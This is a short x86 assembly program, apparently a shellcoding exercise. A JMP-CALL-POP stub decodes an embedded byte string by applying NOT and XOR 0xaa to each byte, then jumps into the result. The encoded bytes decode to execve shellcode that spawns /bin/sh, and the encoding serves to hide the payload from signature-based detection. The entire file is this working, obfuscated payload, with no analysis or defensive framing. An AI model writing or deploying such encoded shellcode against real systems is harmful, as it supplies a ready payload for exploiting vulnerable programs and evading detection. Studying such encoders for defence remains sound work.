global _start 

section .text 

_start:
	jmp short call_encoder
encoder:
	pop esi
	xor ecx, ecx 
	mov cl, 25
loo:
	xor ebx, ebx
	mov byte bl, [esi]
	not bl
	xor bl, 0xaa
	jz code 
	mov byte [esi], bl
	inc esi
	jmp loo
;	loop loo
;	jmp code
	

call_encoder:
	call encoder 
	code: db 0x64, 0x95, 0x05, 0x3d, 0x7a, 0x7a, 0x26, 0x3d, 0x3d, 0x7a, 0x37, 0x3c, 0x3b, 0xdc, 0xb6, 0x05, 0xdc, 0xb7, 0x06, 0xdc, 0xb4, 0xe5, 0x5e, 0x98, 0xd5, 0x55

